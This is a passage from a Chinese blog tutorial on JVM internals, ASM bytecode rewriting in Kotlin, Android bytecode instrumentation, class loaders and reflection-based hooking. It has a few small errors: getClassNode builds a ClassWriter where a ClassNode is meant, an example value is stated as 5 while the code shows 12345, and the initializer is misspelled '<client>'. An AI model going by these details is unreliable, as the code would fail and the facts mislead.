API让我们不用再自定义Visitor，我们可以直接获取一个类的ClassNode，然后通过ClassNode直接获得里面所有的方法/字段信息。\n\n那么我们要如何得到一个ClassNode呢？\n\n~~~kotlin\nfun getClassNode(clazzFile: File): ClassNode {\n    val classReader = ClassReader(clazzFile.inputStream())\n    val classNode = ClassWriter(ASM9)\n    classReader.accept(classNode, 0)\n    return classNode\n}\n~~~\n\n我们可以发现，其实ClassNode就是一个封装过的ClassVisitor。它重写了ClassVisitor所有的访问方法，在访问时把访问到的信息存到类中，然后我们就可以直接从里面获取。***有兴趣可以自己实现一下ClassNode，非常简单。***\n\n~~~kotlin\nval classNode = getClassNode(clazzFile)\n// 获取所有方法信息\nval methods: List<MethodNode> = classNode.methods\n// 获取所有字段信息\nval fields: List<FieldNode> = classNode.fields\n~~~\n\n#### 实战\n\n接下来我会讲解一些asm框架的实战用例，大家有兴趣回去可以跟着敲一敲，都不难。\n\n推荐的参考资料[Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv13433468)\n\n写的时候跟字节码和这个资料对照着看。\n\n##### ApiJarGenerator\n\n> 写这个实战的时候我还只知道Core API，所以以下功能均使用Core API实现\n\n> 我们知道，Java的类文件都是可以反编译的，同时如果要依赖于某个Jar进行开发就必须要有Jar文件。\n>\n> 设想一种情况，我们开发项目人手不够，去找了外包。同时我们有一份自主开发的框架/类库，但我们不希望这份库的Jar文件落入外包者之手，但项目开发必须要依赖这份Jar文件，否则就通不过编译，怎么办呢？\n>\n> 了解了asm框架与JVM字节码结构后我们很容易就能想出一个解决方案，删空Jar文件中所有方法的字节码指令，只留下可供调用的方法声明。这样外包者就无法通过反编译得知方法的具体逻辑，但外包者仍然能调用其中的公开方法，并且项目也能通过编译。\n\n~~~kotlin\n/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author 寒雨\n * @since 2022/7/11 14:22\n */\nfun generate(sourceJar: File, output: File) {\n    if (!output.exists()) {\n        output.createNewFile()\n    }\n    JarOutputStream(output.outputStream()).use { out ->\n        JarFile(sourceJar).use { jarFile ->\n            for (jarEntry in jarFile.entries()) {\n                jarFile.getInputStream(jarEntry).use { input ->\n                    if (jarEntry.name.endsWith(\".class\")) {\n                        // 如果是class文件，就用我们自定义的ClassVisitor visit它\n                        val classReader = ClassReader(input)\n                        val classWriter = ClassWriter(0)\n                        val visitor = EmptyClassVisitor(classWriter)\n                        classReader.accept(visitor, 0)\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        // 写入class文件\n                        out.write(classWriter.toByteArray())\n                    } else {\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        input.copyTo(out)\n                    }\n                }\n            }\n        }\n    }\n}\n\nclass EmptyClassVisitor(visitor: ClassVisitor) : ClassVisitor(ASM9, visitor) {\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return EmptyMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions))\n    }\n}\n\nclass EmptyMethodVisitor(methodVisitor: MethodVisitor) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitIincInsn(`var`: Int, increment: Int) {\n    }\n\n    override fun visitInsn(opcode: Int) {\n    }\n\n    override fun visitIntInsn(opcode: Int, operand: Int) {\n    }\n\n    override fun visitVarInsn(opcode: Int, `var`: Int) {\n    }\n\n    override fun visitTypeInsn(opcode: Int, type: String?) {\n    }\n\n    override fun visitJumpInsn(opcode: Int, label: Label?) {\n    }\n\n    override fun visitLabel(label: Label?) {\n    }\n\n    override fun visitLdcInsn(value: Any?) {\n    }\n\n    override fun visitTableSwitchInsn(min: Int, max: Int, dflt: Label?, vararg labels: Label?) {\n    }\n\n    override fun visitLookupSwitchInsn(dflt: Label?, keys: IntArray?, labels: Array<out Label>?) {\n    }\n\n    override fun visitMultiANewArrayInsn(descriptor: String?, numDimensions: Int) {\n    }\n\n    override fun visitTryCatchBlock(start: Label?, end: Label?, handler: Label?, type: String?) {\n    }\n\n    override fun visitLocalVariable(name: String?, descriptor: String?, signature: String?, start: Label?, end: Label?, index: Int) {\n    }\n\n    override fun visitLineNumber(line: Int, start: Label?) {\n    }\n\n    override fun visitFrame(type: Int, numLocal: Int, local: Array<out Any>?, numStack: Int, stack: Array<out Any>?) {\n    }\n\n    override fun visitFieldInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?, isInterface: Boolean) {\n    }\n\n    override fun visitInvokeDynamicInsn(name: String?, descriptor: String?, bootstrapMethodHandle: Handle?, vararg bootstrapMethodArguments: Any?) {\n    }\n}\n\nfun main() {\n    generate(\n        File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"), \t\t                         File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\")\n    )\n}\n~~~\n\n上面我们让EmptyClassVisitor在visitMethod返回了一个我们自定义的EmptyMethodVisitor，也就是说在访问方法时执行的是在EmptyMethodVisitor中我们自定义的逻辑。而在EmptyMethodVisitor中我们重写了所有方法，把原本的执行父类方法的逻辑删除。这样在访问时便不会想原本一样生成跟之前一样的字节码，而是什么都不做，这样就删掉了方法中方法体的字节码。\n\n##### ASMVersionControl\n\n> 这是在Minecraft服务端插件开发经常中遇见的问题\n>\n> 众所周知，目前主流的minecraft服务端都是第三方反编译官方服务端的代码后对其进行封装而来的，而作为服务端插件开发者，我们大部分时候只需要用到第三方封装的API，但也有例外。\n>\n> 当我们需要调用官方服务端的代码，我们会发现一个问题：不同版本的服务端的官方服务端代码的包名不一样，它们被版本号分隔开来。\n>\n> 比如，在Minecraft 1.16.5版本的官方代码中，所有类都在`net.minecraft.server.v1_16_R3`包下\n>\n> 但在Minecraft 1.12.2版本的代码中，所有类都在`net.minecraft.server.v1_12_R1`包下\n>\n> 关键是它们之间的代码其实没有很大的改动，就是包名不一样了\n>\n> 考虑到版本兼容问题，开发者一般不会直接调用`n.m.s`包下的代码，在ASMVersionControl这个解决方案诞生之前，一般有两种解决方案\n>\n> - 运行时获取版本号，然后拼接字符串通过反射调用\n> - 为不同版本写多份代码，再在运行时判断当前运行版本来决定调用哪一份\n>\n> 这两种解决方案都不太尽人意。反射调用不仅麻烦，还会导致额外的性能开销。而编写多份代码更是白白增加了开发者的工作量，而且需要导入多个版本的服务端核心依赖，导包的时候及其容易导错。\n>\n> 这时候`ASMVersionControl`应运而生，开发者只需要在一个实现类中写一份代码，便可以通过ASM动态代理得到一个实例。开发者可以放心调用实例中的方法，因为这个实例已经被asm修改过了，所有`n.m.s`调用的包名的版本号部分全部被修改为了运行环境的版本号。\n\n这部分逻辑其实ASM已经提供了一个现成的工具`ClassRemapper`来实现，但它本质上也是一个被封装过的`ClassVisitor`，为了方便理解，我们使用ClassVisitor实现。\n\n如果你想知道使用ClassRemapper如何实现，看这里[taboolib/MinecraftRemapper.kt at master · TabooLib/taboolib (github.com)](https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt)\n\n或者你也可以试着自己实现一下ClassRemapper的封装，比较简单。\n\n我们先模拟两个“不同版本”下的类，也就是包名不同，但方法声明相同，实现略有不同的两个类。\n\n~~~java\n// net.minecraft.server.v1_12_R1\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.12\");\n    }\n}\n// net.minecraft.server.v1_16_R3\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.16\");\n    }\n}\n~~~\n\n理想的状态是，我要让我调用`net.minecraft.server.v1_12_R1`的所有方法全部变成`net.minecraft.server.v1_16_R3`。\n\n我们先写一段伪代码\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    // 获得asm修改过的代理对象\n    val nmsProxy: NMSHandler = createProxyInstance<NMSHandler>()\n    nmsProxy.callTest() // 这里输出 execute successfully v1.16, 说明我们修改成功了\n}\n~~~\n\n我们先看看`NMSHandlerImpl#callTest`的字节码指令\n\n>    L0\n>     LINENUMBER 85 L0\n>     NEW net/minecraft/server/v1_12_R1/Test\n>     DUP\n>     INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>     INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n>    L1\n>     LINENUMBER 86 L1\n>     RETURN\n>    L2\n>     LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0\n>     MAXSTACK = 2\n>     MAXLOCALS = 1\n\n我们只需要修改其中所有的 `net/minecraft/server/v1_12_R1/Test`为`net/minecraft/server/v1_16_R3/Test`即可，目前为止我们知道我们肯定首先要先visitMethod，然后在具体的操作方法。\n\n> 需要修改的指令：\n>\n> - NEW net/minecraft/server/v1_12_R1/Test\n>\n> - INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>\n> - INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n\n在[Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv13433468)对照\n\n发现我们只需要重写`visitTypeInsn`, `visitMethodInsn`，并在里面替换对应的参数即可。\n\n~~~kotlin\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n~~~\n\n完整代码如下:\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\nclass VersionControlClassVisitor(classVisitor: ClassVisitor, val currentVersion: String) : ClassVisitor(ASM9, classVisitor) {\n    override fun visitField(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        value: Any?\n    ): FieldVisitor {\n        return VersionControlFieldVisitor(super.visitField(access, name, descriptor, signature, value), currentVersion)\n    }\n\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return VersionControlMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions), currentVersion)\n    }\n}\n\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n\nclass VersionControlFieldVisitor(fieldVisitor: FieldVisitor, val currentVersion: String) : FieldVisitor(ASM9, fieldVisitor) {\n\n}\n\nval nms = \"net/minecraft/server/v1_.*?/\".toRegex()\nval obc = \"org/bukkit/craftbukkit/v1_.*?/\".toRegex()\n\nfun String.modifyVersion(version: String): String {\n    return this.replace(nms, \"net/minecraft/server/$version/\")\n        .replace(obc, \"org/bukkit/craftbukkit/$version/\")\n}\n\n@Suppress(\"UNCHECKED_CAST\")\ninline fun <reified T> createProxyClass(impl: String = T::class.java.name + \"Impl\"): Class<T> {\n    val input = VersionControlClassVisitor::class.java.classLoader.getResourceAsStream(impl.replace(\".\", \"/\") + \".class\")\n    val classReader = ClassReader(input)\n    val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n    classReader.accept(VersionControlClassVisitor(classWriter, \"v1_16_R3\"), 0)\n    return MyClassLoader.defineClass(impl, classWriter.toByteArray()) as Class<T>\n}\n\ninline fun <reified T> createProxyInstance(impl: String = T::class.java.name + \"Impl\"): T {\n    return createProxyClass<T>(impl).getDeclaredConstructor().newInstance()\n}\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    val proxy = createProxyInstance<NMSHandler>()\n    proxy.callTest()\n}\n~~~\n\n上面这段代码的运行结果是`execute successfully v1.16`,证明我们成功替换了代理类中的包名。\n\n其实gradle插件shadowJar重定向(relocate)包名的功能的实现也大同小异，大家有兴趣可以课下自己去实现一下。\n\n##### 字节码插桩\n\n前面几个其实并不是我们安卓开发经常遇到的问题，只是它们解决起来相对简单。安卓开发中asm框架主要是用来字节码插桩的。\n\n字节码插桩其实是hook的一种。\n\n这个我们就不自己写了，我们分析一下大佬写的案例——用字节码插桩实现双击防抖。\n\n先贴下源码链接: [leavesCZY/ASM_Transform: ASM Transform 字节码插桩实战 (github.com)](https://github.com/leavesCZY/ASM_Transform)\n\n谷歌为android量身定制了安卓字节码插桩的解决方案`transform api`来配合gradle使用，***不过它现在已经即将废弃了，最新的解决方案是Gradle提供的TransformAction***，不过这里我们要看的源码仍然是使用transform api来实现字节码插桩，不过问题不大。\n\n###### gradle插件编写\n\n> 字节码插桩一般都是通过自定义gradle插件干预编译实现的\n>\n> 准确来说是在编译后再对编译产物处理一遍\n\n首先我们新建一个`buildSrc`模块，`buildSrc`模块中的代码可以在其他模块的build.gradle中直接引入使用。\n\n然后创建一个插件类\n\n~~~kotlin\n/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */\nclass DoubleClickPlugin : Plugin<Project> {\n\n    override fun apply(project: Project) {\n        val config = DoubleClickConfig()\n        val appExtension: AppExtension = project.extensions.getByType()\n        appExtension.registerTransform(DoubleClickTransform(config))\n    }\n\n}\n~~~\n\n其中apply是在你导入这个插件时执行的逻辑，我们在apply方法中注册了我们写的Transform，在编译时便会执行Transform的对应逻辑。\n\n然后我们只需要在需要使用这个插件的模块导入并apply就可以了\n\n~~~groovy\nimport github.leavesczy.asm.plugins.doubleClick.DoubleClickPlugin\n\napply plugin: DoubleClickPlugin\n~~~\n\n###### transform逻辑\n\n我们先来看看`DoubleClickTransform`中的内容\n\n~~~kotlin\nclass DoubleClickTransform(private val config: DoubleClickConfig) : BaseTransform() {\n\n    private companion object {\n\n        private const val ViewDescriptor = \"Landroid/view/View;\"\n\n        private const val OnClickViewMethodDescriptor = \"(Landroid/view/View;)V\"\n\n        private const val ButterKnifeOnClickAnnotationDesc = \"Lbutterknife/OnClick;\"\n\n        private val MethodNode.onlyOneViewParameter: Boolean\n            get() = desc == OnClickViewMethodDescriptor\n\n        private fun MethodNode.hasCheckViewAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatCheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasUncheckViewOnClickAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatUncheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasButterKnifeOnClickAnnotation(): Boolean {\n            return hasAnnotation(ButterKnifeOnClickAnnotationDesc)\n        }\n\n    }\n\n    override fun modifyClass(byteArray: ByteArray): ByteArray {\n        val classReader = ClassReader(byteArray)\n        val classNode = ClassNode()\n        classReader.accept(classNode, ClassReader.EXPAND_FRAMES)\n        val methods = classNode.methods\n        if (!methods.isNullOrEmpty()) {\n            val shouldHookMethodList = mutableSetOf<String>()\n            for (methodNode in methods) {\n                //静态、包含 UncheckViewOnClick 注解的方法不用处理\n                if (methodNode.isStatic ||\n                    methodNode.hasUncheckViewOnClickAnnotation(config)\n                ) {\n                    continue\n                }\n                val methodNameWithDesc = methodNode.nameWithDesc\n                if (methodNode.onlyOneViewParameter) {\n                    if (methodNode.hasCheckViewAnnotation(config)) {\n                        //添加了 CheckViewOnClick 注解的情况\n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    } else if (methodNode.hasButterKnifeOnClickAnnotation()) {\n                        //使用了 ButterKnife，且当前 method 添加了 OnClick 注解\n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    }\n                }\n                if (classNode.isHookPoint(config, methodNode)) {\n                    shouldHookMethodList.add(methodNameWithDesc)\n                    continue\n                }\n                //判断方法内部是否有需要处理的 lambda 表达式\n                val invokeDynamicInsnNodes = methodNode.findHookPointLambda(config)\n                invokeDynamicInsnNodes.forEach {\n                    val handle = it.bsmArgs[1] as? Handle\n                    if (handle != null) {\n                        shouldHookMethodList.add(handle.name + handle.desc)\n                    }\n                }\n            }\n            if (shouldHookMethodList.isNotEmpty()) {\n                for (methodNode in methods) {\n                    val methodNameWithDesc = methodNode.nameWithDesc\n                    if (shouldHookMethodList.contains(methodNameWithDesc)) {\n                        val argumentTypes = Type.getArgumentTypes(methodNode.desc)\n                        val viewArgumentIndex = argumentTypes?.indexOfFirst {\n                            it.descriptor == ViewDescriptor\n                        } ?: -1\n                        if (viewArgumentIndex >= 0) {\n                            val instructions = methodNode.instructions\n                            if (instructions != null && instructions.size() > 0) {\n                                val list = InsnList()\n                                list.add(\n                                    VarInsnNode(\n                                        Opcodes.ALOAD, getVisitPosition(\n                                            argumentTypes,\n                                            viewArgumentIndex,\n                                            methodNode.isStatic\n                                        )\n                                    )\n                                )\n                                list.add(\n                                    MethodInsnNode(\n                                        Opcodes.INVOKESTATIC,\n                                        config.formatDoubleCheckClass,\n                                        config.doubleCheckMethodName,\n                                        config.doubleCheckMethodDescriptor\n                                    )\n                                )\n                                val labelNode = LabelNode()\n                                list.add(JumpInsnNode(Opcodes.IFNE, labelNode))\n                                list.add(InsnNode(Opcodes.RETURN))\n                                list.add(labelNode)\n                                instructions.insert(list)\n                            }\n                        }\n                    }\n                }\n                val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n                classNode.accept(classWriter)\n                return classWriter.toByteArray()\n            }\n        }\n        return byteArray\n    }\n\n    private fun ClassNode.isHookPoint(config: DoubleClickConfig, methodNode: MethodNode): Boolean {\n        val myInterfaces = interfaces\n        if (myInterfaces.isNullOrEmpty()) {\n            return false\n        }\n        val extraHookMethodList = config.hookPointList\n        extraHookMethodList.forEach {\n            if (myInterfaces.contains(it.interfaceName) && methodNode.nameWithDesc == it.methodSign) {\n                return true\n            }\n        }\n        return false\n    }\n\n    private fun MethodNode.findHookPointLambda(config: DoubleClickConfig): List<InvokeDynamicInsnNode> {\n        val onClickListenerLambda = findLambda {\n            val nodeName = it.name\n            val nodeDesc = it.desc\n            val find = config.hookPointList.find { point ->\n                nodeName == point.methodName && nodeDesc.endsWith(point.interfaceSignSuffix)\n            }\n            return@findLambda find != null\n        }\n        return onClickListenerLambda\n    }\n\n    override fun getInputTypes(): Set<QualifiedContent.ContentType> {\n        return TransformManager.CONTENT_CLASS\n    }\n\n    override fun getScopes(): MutableSet<in QualifiedContent.Scope> {\n        return mutableSetOf(\n            QualifiedContent.Scope.PROJECT,\n            QualifiedContent.Scope.SUB_PROJECTS,\n//            QualifiedContent.Scope.EXTERNAL_LIBRARIES\n        )\n    }\n\n}\n~~~\n\n他自己封装了一个`BaseTransform`，把修改class的过程封装成了一个`modifierClass(byteArray: ByteArray): ByteArray`方法，让我们能更专注于修改类信息的过程。至于他是怎么封装的也可以课下了解，这里我们着重讲他如何使用asm。\n\n我们首先分析他的逻辑，无外乎两点：\n\n- 找到hook点（ButterKnife的onClick注解，View#setOnClickListener）\n- 在hook点插入逻辑代码\n\n> 这里自由发挥吧，随便讲点就差不多了。\n\n## 虚拟机类加载机制\n\n![13202633-3cb11d1712a9efc9](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp)\n\n### 类的生命周期\n\n#### 加载 Loading\n\n> 虚拟机从io流读取类文件到内存中。\n>\n> 加载过程主要完成三件事情：\n>\n> 1. 通过类的全限定名来获取定义此类的二进制字节流\n> 2. 将这个类字节流代表的静态存储结构转为方法区的运行时数据结构\n> 3. 在堆中生成一个代表此类的java.lang.Class对象，作为访问方法区这些数据结构的入口。\n>\n> 这个过程主要就是类加载器完成。\n\n#### 验证 Verification\n\n> 此阶段主要确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机的自身安全。\n>\n> 1. 文件格式验证：基于字节流验证。\n> 2. 元数据验证：基于***方法区***的存储结构验证。\n> 3. 字节码验证：基于方法区的存储结构验证。\n> 4. 符号引用验证：基于方法区的存储结构验证。\n\n#### 准备 Preparation\n\n> 为类变量分配内存，并将其初始化为默认值。（此时为默认值，在初始化的时候才会给变量赋值）即在方法区中分配这些变量所使用的内存空间\n\n例如\n\n~~~java\npublic class Main {\n    public static int value = 12345;\n}\n~~~\n\n虽说value在代码中被初始化为5，但这时value的值仍然为0，变量要在初始化阶段才会被赋初值（如果有）。\n\n#### 解析 Resolution\n\n> 把类型中的符号引用转换为直接引用。\n>\n> - 符号引用与虚拟机实现的布局无关，引用的目标并不一定要已经加载到内存中。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。\n> - 直接引用可以是指向目标的指针，相对偏移量或是一个能间接定位到目标的句柄。如果有了直接引用，那引用的目标必定已经在内存中存在\n>\n> 主要有以下四种：\n>\n> - 类或接口的解析\n> - 字段解析\n>\n> - 类方法解析\n>\n> - 接口方法解析\n\n#### 初始化 Initialization\n\n> 初始化阶段是执行类构造器<client>方法的过程。<client>方法是由编译器自动收集类中的类变量的赋值操作和静态语句块中的语句合并而成的。虚拟机会保证<client>方法执行之前，父类的<client>方法已经执行完毕。如果一个类中没有对静态变量赋值也没有静态语句块，那么编译器可以不为这个类生成<client>()方法。\n>\n> java中，对于初始化阶段，有且只有以下五种情况才会对要求类立刻“初始化”（加载，验证，准备，自然需要在此之前开始）：\n>\n> - 使用new关键字实例化对象、访问或者设置一个类的静态字段（被final修饰、编译器优化时已经放入常量池的例外）、调用类方法，都会初始化该静态字段或者静态方法所在的类。\n>\n> - 初始化类的时候，如果其父类没有被初始化过，则要先触发其父类初始化。\n>\n> - 使用java.lang.reflect包的方法进行反射调用的时候，如果类没有被初始化，则要先初始化。\n>\n> - 虚拟机启动时，用户会先初始化要执行的主类（含有main）\n>\n> - jdk 1.7后，如果java.lang.invoke.MethodHandle的实例最后对应的解析结果是 REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄，并且这个方法所在类没有初始化，则先初始化。\n\n#### 卸载 Unloading\n\n> 在栈中不存在该类的实例与Class对象，且加载该类的classLoader失去gc roots时，换言之该类已经失去了gc roots，被gc回收，此时可以称作该类成功从jvm中卸载了，这条机制也是一些热修复方案的实现原理(其实现在大部分的热修复都是用JavaAgent实现类的热替换）。\n\n### 类加载器 (ClassLoader)\n\n#### 各司其职\n\nJVM 运行实例中会存在多个 ClassLoader，不同的 ClassLoader 会从不同的地方加载字节码文件。它可以从不同的文件目录加载，也可以从不同的 jar 文件中加载，也可以从网络上不同的服务地址来加载。\n\nJVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。\n\nBootstrapClassLoader 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 java.util.*、java.io.*、java.nio.*、java.lang.* 等等。这个 ClassLoader 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。\n\nExtensionClassLoader 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。\n\nAppClassLoader 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。\n\n那些位于网络上静态文件服务器提供的 jar 包和 class文件，jdk 内置了一个 URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。\n\nAppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，它就是我们所说的「系统类加载器」，我们用户平时编写的类代码通常都是由它加载的。当我们的 main 方法执行的时候，这第一个用户类的加载器就是 AppClassLoader。\n\n#### ClassLoader 传递性\n\n程序在运行过程中，遇到了一个未知的类，它会选择哪个 ClassLoader 来加载它呢？虚拟机的策略是使用调用者 Class 对象的 ClassLoader 来加载当前未知的类。何为调用者 Class 对象？就是在遇到这个未知的类时，虚拟机肯定正在运行一个方法调用（静态方法或者实例方法），这个方法挂在哪个类上面，那这个类就是调用者 Class 对象。前面我们提到每个 Class 对象里面都有一个 classLoader 属性记录了当前的类是由谁来加载的。\n\n因为 ClassLoader 的传递性，所有延迟加载的类都会由初始调用 main 方法的这个 ClassLoader 全全负责，它就是 AppClassLoader。\n\n#### 双亲委派\n\n双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。\n\n使用双亲委派模型的好处在于**Java类随着它的类加载器一起具备了一种带有优先级的层次关系**。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。\n\n![类加载器的双亲委派模型](https://img-blog.csdn.net/20160506184936657)\n\n**双亲委派模型的系统实现**\n\n在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。\n\n```java\nprotected synchronized Class<?> loadClass(String name,boolean resolve)throws ClassNotFoundException{\n    //check the class has been loaded or not\n    Class c = findLoadedClass(name);\n    if(c == null){\n        try{\n            if(parent != null){\n                c = parent.loadClass(name,false);\n            }else{\n                c = findBootstrapClassOrNull(name);\n            }\n        }catch(ClassNotFoundException e){\n            //if throws the exception ,the father can not complete the load\n        }\n        if(c == null){\n            c = findClass(name);\n        }\n    }\n    \n    if(resolve){\n        resolveClass(c);\n    }\n    return c;\n}\n```\n\n注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见《深入理解Java虚拟机》。\n\n## Hook\n\n### 什么是Hook\n\nhook我认为更像是一种思想，而非一门单独的技术，其实就是通过一些旁门左道去通过代理修改别人的代码来达成一些意想不到的功能。而通过这些旁门左道其实是没办法随心所欲的修改代码的，所以我们需要从某些地方入手，这些地方被称作**hook点**。\n\n### 怎么实现Hook\n\n![img](https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg)\n\n那我就讲讲最基础的反射/动态代理Hook吧。\n\n假如我们导入的外部库的网络请求部分有这么一段代码:\n\n~~~kotlin\nobject ServiceHolder {\n    val apiService: IWebServiceRepository = WebServiceRepository()\n    // ...\n}\n\n// WebServiceRepository\nclass WebServiceRepository : IWebServiceRepository {\n    private val BASE_URL = \"https://api.bifrost.kim\"\n    \n    override fun getJsonData(): Data {\n        // ...\n    }\n}\n~~~\n\n然而它的接口改了，我们需要修改一下请求的方式\n\n最简单的方法就是我们直接动态代理apiService，然后反射放进去。\n\n但InvocationHandler提供的动态代理也许不是很方便，只能在头部或者尾部插入逻辑。即便我们只需要修改部分字符串，就得重写整个网络请求方法的逻辑。\n\n那么更好的方法是什么呢，正是字节码插桩，我们使用字节码生成一个一样的类，再用asm稍微的修改这其中的部分逻辑即可。\n\n### 利用LSposed实现全局Hook (有时间再研究)\n\n> 有时间再说吧 我没研究（\n","slug":"simple-in-simple-out-jvm","published":1,"updated":"2022-11-24T02:44:36.024Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jty002qsfklcez0fbg1","content":"<h1 id=\"浅入浅出JVM-amp-Hook\"><a href=\"#浅入浅出JVM-amp-Hook\" class=\"headerlink\" title=\"浅入浅出JVM &amp; Hook\"></a>浅入浅出JVM &amp; Hook</h1><blockquote>\n<p>其中混杂有相当多的个人理解，如有谬误烦请学长指正</p>\n</blockquote>\n<h2 id=\"什么是JVM\"><a href=\"#什么是JVM\" class=\"headerlink\" title=\"什么是JVM\"></a>什么是JVM</h2><p><strong>Java Virtual Machine</strong>，即Java虚拟机。那么虚拟机又是什么？</p>\n<blockquote>\n<p>虚拟机（Virtual 